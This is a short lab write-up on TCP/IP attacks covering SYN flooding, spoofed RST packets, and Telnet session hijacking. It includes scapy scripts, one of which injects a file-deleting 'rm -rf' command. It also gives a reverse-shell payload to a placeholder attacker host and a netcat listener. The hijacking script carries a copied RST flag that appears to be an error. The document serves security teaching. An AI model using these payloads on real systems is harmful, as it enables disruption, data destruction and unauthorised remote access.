# TCP/IP Attack Lab

## Fei Guo

## SYN Flooding Attack

First, check if syncookies is on:
`sudo sysctl -a | grep cookie`

If on, turn off the syncookies:
`sudo sysctl -w net.ipv4.tcp_syncookies=0`

Run this to check the usage of the TCP queue:

`netstat -tna`

Note, a half-open connection will show an "SYN_RECV" state.

Then, use the netwox tool to launch the attack:

`sudo netwox 76 -i 10.0.2.4 -p 23 -s raw`

where -s raw means enabling IP spoofing.

##  Countermeasure: SYN Cookies

Turn on the syncookies and the attack will fail.

`sudo sysctl -w net.ipv4.tcp_syncookies=1`


## TCP RST Attacks on telnet Connections

On the same LAN, the attacker can use this to spoof a RST packet and disconnect a Telnect connection between two hosts:

```python
#!/usr/bin/env python3
from scapy.all import *
ip = IP(src=src_host, dst=dst_host)
tcp = TCP(sport=source_port, dport=dst_port, flags="R", seq=seq_num)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
```
The same thing can be done for an SSH connection as well because SSH encryption are in the Transport layer (payload of TCP are encrypted), but a packet can still be sniffed and spoofed. If we want more security, a VPN can be used to encrypt the packet.

## TCP Session Hijacking

To hijack a Telnet connection, we can first sniff the packets between two hosts, and then spoof a packet with appended data that will be run as a command by the server.

```python
#!/usr/bin/env python3
from scapy.all import *
ip = IP(src=src_host, dst=dst_host)
tcp = TCP(sport=source_port, dport=dst_port, flags="R", seq=seq_num)
data = "\r rm -rf ." # delete all files on the server
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
```

## Creating Reverse Shell Using TCP Session Hijacking

The main point is to replace the data part in the previous piece of code with the following. It says that the server should redirect its input and output to a remote host:

`'/bin/bash -I /dev/tcp/<attacker_host>/9090 0<&1 2>&1'`

where attacker host has an open port listening to the traffic, that can be initialized with:
`nc -lnv 9090`

